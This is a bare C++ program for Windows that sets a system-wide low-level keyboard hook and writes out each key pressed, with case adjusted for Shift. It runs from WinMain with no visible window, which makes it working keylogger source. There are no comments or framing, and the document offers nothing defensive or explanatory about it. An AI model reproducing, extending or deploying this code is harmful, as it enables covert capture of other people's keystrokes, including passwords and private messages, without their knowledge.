#include <windows.h>
#include <iostream>

using namespace std;

HHOOK keyboard;
KBDLLHOOKSTRUCT keyboardstruct;
bool CapsStatus = false;

LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam){
    if (keyboardcode >= 0){
        keyboardstruct = *((KBDLLHOOKSTRUCT*)lParam);
        if (wParam == WM_KEYDOWN){
            if (GetKeyState(16) < 0){
                char c = MapVirtualKey(keyboardstruct.vkCode, 2);
                cout << (char)toupper(c) << endl;}
            else{
                char c = MapVirtualKey(keyboardstruct.vkCode, 2);
                cout << (char)tolower(c) << endl;}}}
    return CallNextHookEx(keyboard, keyboardcode, wParam, lParam);}

void CreateHook(){
    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);}

int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr,int cmd){
    CreateHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);}
    return msg.wParam;}